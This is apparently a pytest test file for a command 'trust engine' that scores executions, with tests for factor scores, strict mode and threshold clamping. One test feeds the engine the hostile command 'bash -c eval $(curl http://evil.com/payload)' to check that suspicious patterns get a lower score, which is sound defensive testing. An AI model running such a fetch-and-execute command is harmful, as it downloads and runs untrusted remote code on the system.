"""
Tests for Trust Engine module.
"""

import asyncio
import pytest
from pathlib import Path

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
from core.amcis_trust_engine import (
    TrustEngine, TrustScore, ExecutionContext, TrustFactor
)


class TestTrustEngine:
    """Test cases for TrustEngine."""
    
    @pytest.fixture
    def engine(self):
        """Create a trust engine instance."""
        return TrustEngine(threshold=0.6)
    
    @pytest.fixture
    def execution_context(self):
        """Create a sample execution context."""
        return ExecutionContext(
            command="/bin/ls",
            arguments=["-la"],
            working_directory=Path("/tmp"),
            environment={"PATH": "/usr/bin"},
            user_id=1000,
            session_id="test_session"
        )
    
    @pytest.mark.asyncio
    async def test_trust_evaluation(self, engine, execution_context):
        """Test basic trust evaluation."""
        result = await engine.evaluate(execution_context)
        
        assert isinstance(result, TrustScore)
        assert 0.0 <= result.overall_score <= 1.0
        assert result.threshold == 0.6
    
    @pytest.mark.asyncio
    async def test_trust_factors_present(self, engine, execution_context):
        """Test that all trust factors are evaluated."""
        result = await engine.evaluate(execution_context)
        
        for factor in TrustFactor:
            assert factor in result.factor_scores
            assert 0.0 <= result.factor_scores[factor] <= 1.0
    
    @pytest.mark.asyncio
    async def test_suspicious_pattern_detection(self, engine):
        """Test detection of suspicious command patterns."""
        suspicious_context = ExecutionContext(
            command="bash",
            arguments=["-c", "eval $(curl http://evil.com/payload)"],
            working_directory=Path("/tmp"),
            environment={},
            user_id=1000,
            session_id="test_session"
        )
        
        result = await engine.evaluate(suspicious_context)
        
        # Should have lower score due to suspicious patterns
        assert result.overall_score < 0.8
    
    @pytest.mark.asyncio
    async def test_strict_mode(self, engine, execution_context):
        """Test strict mode evaluation."""
        result_normal = await engine.evaluate(execution_context, strict_mode=False)
        result_strict = await engine.evaluate(execution_context, strict_mode=True)
        
        assert result_strict.threshold > result_normal.threshold
    
    def test_threshold_update(self, engine):
        """Test threshold updating."""
        engine.update_threshold(0.8)
        assert engine.threshold == 0.8
        
        # Test clamping
        engine.update_threshold(1.5)
        assert engine.threshold == 1.0
        
        engine.update_threshold(-0.5)
        assert engine.threshold == 0.0
